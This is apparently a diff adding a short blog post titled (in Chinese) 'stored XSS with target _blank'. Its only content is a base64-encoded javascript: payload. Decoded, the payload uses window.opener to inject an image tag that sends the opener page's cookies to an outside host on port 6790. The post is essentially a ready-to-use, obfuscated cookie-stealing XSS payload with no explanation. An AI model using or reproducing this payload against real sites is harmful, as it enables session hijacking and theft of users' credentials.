@@ -1,0 +1,9 @@
+---
+title: 目标为_blank的存储型xss
+abbrlink: 17587
+url: /posts/17587.html
+date: 2021-01-19 14:32:31
+tags:
+---
+
+amF2YXNjcmlwdDp3aW5kb3cub3BlbmVyLmRvY3VtZW50LmhlYWQuaW5uZXJIVE1MICs9JzxpbWcgc3JjPWh0dHA6Ly9sOTIuMTY4LjQ4LjY6Njc5MD9jb29raWU9JysgZXNjYXBlKHdpbmRvdy5vcGVuZXIuZG9jdW1lbnQuY29va2llKSArICcvPic7
